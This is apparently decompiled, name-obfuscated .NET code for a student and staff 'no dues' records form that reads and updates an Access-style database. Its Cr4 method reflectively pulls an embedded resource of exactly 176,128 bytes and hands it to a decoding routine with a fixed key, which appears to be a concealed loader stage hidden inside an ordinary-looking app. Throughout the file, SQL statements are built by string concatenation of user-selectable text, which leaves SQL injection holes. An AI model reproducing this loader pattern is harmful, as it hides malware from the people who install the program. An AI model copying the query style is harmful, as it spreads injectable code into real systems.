	internal virtual void z0J(ComboBox z1R)
	{
		EventHandler eventHandler = b1E;
		ComboBox cmbSession = _cmbSession;
		if (cmbSession != null)
		{
			cmbSession.remove_SelectedIndexChanged(eventHandler);
		}
		_cmbSession = z1R;
		cmbSession = _cmbSession;
		if (cmbSession != null)
		{
			cmbSession.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label w5P()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qx4(Label f9S)
	{
		_Label2 = f9S;
	}

	[SpecialName]
	internal virtual Label c1Z()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z1P(Label m5G)
	{
		_Label1 = m5G;
	}

	[SpecialName]
	internal virtual ComboBox e3N()
	{
		return _cmbDepartment;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gi7(ComboBox e4J)
	{
		_cmbDepartment = e4J;
	}

	[SpecialName]
	internal virtual ComboBox s9T()
	{
		return _cmbCourse;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b4A(ComboBox r8D)
	{
		EventHandler eventHandler = j0T;
		ComboBox cmbCourse = _cmbCourse;
		if (cmbCourse != null)
		{
			cmbCourse.remove_SelectedIndexChanged(eventHandler);
		}
		_cmbCourse = r8D;
		cmbCourse = _cmbCourse;
		if (cmbCourse != null)
		{
			cmbCourse.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TabPage w4F()
	{
		return _TabPage2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e7P(TabPage d1Y)
	{
		_TabPage2 = d1Y;
	}

	[SpecialName]
	private virtual TextBox e3E()
	{
		return _txtStatus1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Dx3(TextBox d0S)
	{
		_txtStatus1 = d0S;
	}

	[SpecialName]
	private virtual Panel a7H()
	{
		return _Panel2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void a9G(Panel n2J)
	{
		_Panel2 = n2J;
	}

	[SpecialName]
	private virtual ListView Jj9()
	{
		return _ListView2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Yz3(ListView Qp2)
	{
		_ListView2 = Qp2;
	}

	[SpecialName]
	private virtual ColumnHeader Hd4()
	{
		return _ColumnHeader2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void c7Z(ColumnHeader Gt2)
	{
		_ColumnHeader2 = Gt2;
	}

	[SpecialName]
	private virtual ColumnHeader k4T()
	{
		return _ColumnHeader4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void c8Q(ColumnHeader m0T)
	{
		_ColumnHeader4 = m0T;
	}

	[SpecialName]
	internal virtual GroupBox Rg5()
	{
		return _GroupBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zj9(GroupBox o1D)
	{
		_GroupBox1 = o1D;
	}

	[SpecialName]
	internal virtual Label x4L()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Aq6(Label i0X)
	{
		_Label6 = i0X;
	}

	[SpecialName]
	internal virtual ComboBox p8F()
	{
		return _cmbDepartment1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p0D(ComboBox y2J)
	{
		_cmbDepartment1 = y2J;
	}

	public void Qk5()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OleDbConnection val = new OleDbConnection(cs);
			val.Open();
			adp = new OleDbDataAdapter();
			adp.set_SelectCommand(new OleDbCommand("SELECT distinct RTRIM(Stu_Session) FROM Student", val));
			ds = new DataSet("ds");
			((DbDataAdapter)(object)adp).Fill(ds);
			dtable = ds.Tables[0];
			Gx3().get_Items().Clear();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dtable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					Gx3().get_Items().Add((object)dataRow[0].ToString());
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	public void Ny4()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OleDbConnection val = new OleDbConnection(cs);
			val.Open();
			adp = new OleDbDataAdapter();
			adp.set_SelectCommand(new OleDbCommand("SELECT distinct RTRIM(Department) FROM Staff", val));
			ds = new DataSet("ds");
			((DbDataAdapter)(object)adp).Fill(ds);
			dtable = ds.Tables[0];
			p8F().get_Items().Clear();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dtable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					p8F().get_Items().Add((object)dataRow[0].ToString());
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void Co7(object sender, EventArgs e)
	{
		Qk5();
		Ny4();
	}

	public void Ht9()
	{
		Gx3().set_Text("");
		s9T().set_Text("");
		e3N().set_Text("");
		((Control)s9T()).set_Enabled(false);
		((Control)e3N()).set_Enabled(false);
		((Control)btnUpdate_record).set_Enabled(false);
		r5T().get_Items().Clear();
	}

	public void w1M()
	{
		p8F().set_Text("");
		((Control)btnUpdate1).set_Enabled(false);
		Jj9().get_Items().Clear();
	}

	private void q0C(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Gx3().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please select session", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)Gx3()).Focus();
			return;
		}
		if (Operators.CompareString(s9T().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please select course", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)s9T()).Focus();
			return;
		}
		if (Operators.CompareString(e3N().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please select department", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)e3N()).Focus();
			return;
		}
		checked
		{
			try
			{
				((Control)btnUpdate_record).set_Enabled(true);
				ListView val = r5T();
				val.Clear();
				val.get_Columns().Add("Student ID", 100, (HorizontalAlignment)0);
				val.get_Columns().Add("Student Name", 250, (HorizontalAlignment)2);
				val.get_Columns().Add("Status", 0, (HorizontalAlignment)2);
				con = new OleDbConnection(cs);
				con.Open();
				cmd = new OleDbCommand("select Student.StudentID,StudentName,Status from NoDues_Student,Student where NoDues_Student.StudentID=Student.StudentID and Course = '" + s9T().get_Text() + "' and Department= '" + e3N().get_Text() + "' and Stu_Session= '" + Gx3().get_Text() + "' order by StudentName", con);
				rdr = cmd.ExecuteReader();
				while (rdr.Read())
				{
					ListViewItem val2 = new ListViewItem();
					val2.set_Text(rdr.get_Item(0).ToString()!.Trim());
					val2.get_SubItems().Add(rdr.get_Item(1).ToString()!.Trim());
					val2.get_SubItems().Add(rdr.get_Item(2).ToString()!.Trim());
					r5T().get_Items().Add(val2);
					int num = r5T().get_Items().get_Count() - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Operators.CompareString(r5T().get_Items().get_Item(i).get_SubItems()
							.get_Item(2)
							.get_Text(), "Yes", false) == 0)
						{
							r5T().get_Items().get_Item(i).set_Checked(true);
						}
						else
						{
							r5T().get_Items().get_Item(i).set_Checked(false);
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void x3N(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				int num = r5T().get_Items().get_Count() - 1;
				for (int i = num; i >= 0; i += -1)
				{
					con = new OleDbConnection(cs);
					if (r5T().get_Items().get_Item(i).get_Checked())
					{
						Nz2().set_Text("Yes");
					}
					else
					{
						Nz2().set_Text("No");
					}
					string text = "update NoDues_Student set Status='" + Nz2().get_Text() + "' where StudentID= '" + r5T().get_Items().get_Item(i).get_SubItems()
						.get_Item(0)
						.get_Text() + "'";
					cmd = new OleDbCommand(text);
					cmd.set_Connection(con);
					con.Open();
					cmd.ExecuteNonQuery();
					con.Close();
				}
				MessageBox.Show("Successfully updated", "Record", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((Control)btnUpdate_record).set_Enabled(false);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void b1E(object sender, EventArgs e)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			s9T().get_Items().Clear();
			s9T().set_Text("");
			((Control)s9T()).set_Enabled(true);
			((Control)s9T()).Focus();
			con = new OleDbConnection(cs);
			con.Open();
			string text = "select distinct RTRIM(Course) from Student where Stu_Session= '" + Gx3().get_Text() + "'";
			cmd = new OleDbCommand(text);
			cmd.set_Connection(con);
			rdr = cmd.ExecuteReader();
			while (rdr.Read())
			{
				s9T().get_Items().Add(RuntimeHelpers.GetObjectValue(rdr.get_Item(0)));
			}
			con.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void j0T(object sender, EventArgs e)
	{
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			s9T().set_Text(s9T().get_Text().Trim());
			e3N().get_Items().Clear();
			e3N().set_Text("");
			((Control)e3N()).set_Enabled(true);
			((Control)e3N()).Focus();
			con = new OleDbConnection(cs);
			con.Open();
			string text = "select distinct RTRIM(Department) from Student where course = '" + s9T().get_Text() + "'";
			cmd = new OleDbCommand(text);
			cmd.set_Connection(con);
			rdr = cmd.ExecuteReader();
			while (rdr.Read())
			{
				e3N().get_Items().Add(RuntimeHelpers.GetObjectValue(rdr.get_Item(0)));
			}
			con.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void Qk5(object sender, EventArgs e)
	{
		Ht9();
	}

	private void m2R(object sender, EventArgs e)
	{
		w1M();
	}

	private void Wp5(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				int num = Jj9().get_Items().get_Count() - 1;
				for (int i = num; i >= 0; i += -1)
				{
					con = new OleDbConnection(cs);
					if (Jj9().get_Items().get_Item(i).get_Checked())
					{
						e3E().set_Text("Yes");
					}
					else
					{
						e3E().set_Text("No");
					}
					string text = "update NoDues_Staff set Status='" + e3E().get_Text() + "' where StaffID= '" + Jj9().get_Items().get_Item(i).get_SubItems()
						.get_Item(0)
						.get_Text() + "'";
					cmd = new OleDbCommand(text);
					cmd.set_Connection(con);
					con.Open();
					cmd.ExecuteNonQuery();
					con.Close();
				}
				MessageBox.Show("Successfully updated", "Record", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((Control)btnUpdate1).set_Enabled(false);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Bs6(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(p8F().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please select department", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)p8F()).Focus();
			return;
		}
		checked
		{
			try
			{
				((Control)btnUpdate1).set_Enabled(true);
				ListView val = Jj9();
				val.Clear();
				val.get_Columns().Add("Staff ID", 100, (HorizontalAlignment)0);
				val.get_Columns().Add("Staff Name", 250, (HorizontalAlignment)2);
				val.get_Columns().Add("Status", 0, (HorizontalAlignment)2);
				con = new OleDbConnection(cs);
				con.Open();
				cmd = new OleDbCommand("select Staff.StaffID,StaffName,Status from NoDues_Staff,Staff where NoDues_Staff.StaffID=Staff.StaffID and Department= '" + p8F().get_Text() + "' order by StaffName", con);
				rdr = cmd.ExecuteReader();
				while (rdr.Read())
				{
					ListViewItem val2 = new ListViewItem();
					val2.set_Text(rdr.get_Item(0).ToString()!.Trim());
					val2.get_SubItems().Add(rdr.get_Item(1).ToString()!.Trim());
					val2.get_SubItems().Add(rdr.get_Item(2).ToString()!.Trim());
					Jj9().get_Items().Add(val2);
					int num = Jj9().get_Items().get_Count() - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Operators.CompareString(Jj9().get_Items().get_Item(i).get_SubItems()
							.get_Item(2)
							.get_Text(), "Yes", false) == 0)
						{
							Jj9().get_Items().get_Item(i).set_Checked(true);
						}
						else
						{
							Jj9().get_Items().get_Item(i).set_Checked(false);
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
		}
	}

	internal static object[] Cr4(object x2G)
	{
		byte[] array = new byte[checked(Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(x2G, new object[1] { 0 }, (string[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1)];
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateIndexGet(x2G, new object[1] { 2 }, (string[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				try
				{
					using Stream stream = ((Assembly)NewLateBinding.LateIndexGet(x2G, new object[1] { 1 }, (string[])null)).GetManifestResourceStream(Conversions.ToString(objectValue));
					if (stream.Length == 176128L)
					{
						stream.ReadAsync(array, 0, array.Length).Wait();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		NewLateBinding.LateIndexSet(x2G, new object[2] { 0, array }, (string[])null);
		return Hd3.Mt9(RuntimeHelpers.GetObjectValue(x2G), 117);
	}

	private void r8D(object sender, EventArgs e)
	{
	}

	private void s2L(object sender, EventArgs e)
	{
	}

	private void Ly4(object sender, EventArgs e)
	{
		Ht9();
		w1M();
	}
}
